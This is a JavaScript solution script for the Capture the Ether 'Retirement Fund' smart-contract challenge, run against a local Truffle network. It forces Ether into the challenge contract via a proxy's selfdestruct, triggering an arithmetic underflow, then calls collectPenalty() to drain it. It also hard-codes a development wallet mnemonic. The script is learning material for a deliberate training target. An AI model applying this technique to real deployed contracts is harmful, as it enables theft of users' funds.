/**
 * INSTRUCTIONS
 *
 * 1. Start development network by running `truffle development`
 * 2. Copy mnemonic to the variable below and double-check localhost port is correct
 * 3. Run migration in development and re-execute all the steps: `truffle migrate --reset`
 * 4. Copy guess and proxy recently created contract addresses to the variables below
 *
 * SOLUTION
 *
 * Due to require(msg.sender == owner), where owner is the capturetheether factory contract,
 * we could never call withdraw().
 *
 * https://docs.soliditylang.org/en/v0.8.9/contracts.html
 *
 * "A contract without a receive Ether function can receive Ether as a recipient
 * of a coinbase transaction (aka miner block reward) or as a destination of a selfdestruct.
 *
 * A contract cannot react to such Ether transfers and thus also cannot reject them.
 * This is a design choice of the EVM and Solidity cannot work around it.
 *
 * It also means that address(this).balance can be higher than the sum of some manual accounting
 * implemented in a contract (i.e. having a counter updated in the receive Ether function)."
 *
 * So basically we want to "underflow" this operation "startBalance - address(this).balance"
 */

const HDWalletProvider = require("@truffle/hdwallet-provider");
const Web3 = require("web3");
const Web3Utils = require("web3-utils");
const fs = require("fs");

const mnemonic =
  "process pool juice infant shallow nuclear fit math win auction kitten slight";

const provider = new HDWalletProvider({
  mnemonic: {
    phrase: mnemonic,
  },
  providerOrUrl: "http://localhost:9545",
});

const web3 = new Web3(provider);

const proxyAbi = JSON.parse(
  fs.readFileSync("./3_retirement_fund_local/build/contracts/ProxyContract.json")
).abi;

const challengeAbi = JSON.parse(
  fs.readFileSync(
    "./3_retirement_fund_local/build/contracts/RetirementFundChallenge.json"
  )
).abi;

// replace contract addresses accordingly after running `truffle migrate --reset`
const challengeContractAddress = "0x570A61bBcB1a2316c0A57ABB081bdE552298765C";
const proxyContractAddress = "0x47697Aec2859FcEa8cF0659A2aE52CB28086d600";

const outputBalances = (userAccount) => {
  web3.eth.getBalance(userAccount, (_, balance) => {
    console.log("Account balance: " + Web3Utils.fromWei(balance, "ether"));
  });
  web3.eth.getBalance(challengeContractAddress, (_, balance) => {
    console.log(
      "ChallengeContract balance: " + Web3Utils.fromWei(balance, "ether")
    );
  });
  web3.eth.getBalance(proxyContractAddress, (_, balance) => {
    console.log(
      "ProxyContract balance: " + Web3Utils.fromWei(balance, "ether")
    );
  });
};

async function main() {
  try {
    const accounts = await web3.eth.getAccounts();
    const proxyContract = new web3.eth.Contract(proxyAbi, proxyContractAddress);
    const challengeContract = new web3.eth.Contract(
      challengeAbi,
      challengeContractAddress
    );
    const gasPrice = await web3.eth.getGasPrice();
    let res;

    outputBalances(accounts[1]);

    res = await proxyContract.methods
      .destroy(challengeContractAddress)
      .send({ from: accounts[1], gasPrice })

    console.log(res);

    outputBalances(accounts[1]);

    res = await challengeContract.methods
      .collectPenalty()
      .send({ from: accounts[1], gasPrice })

    console.log(res);

    outputBalances(accounts[1]);
  } catch (ex) {
    console.log(ex);
  } finally {
    provider.engine.stop();
  }
}

main();
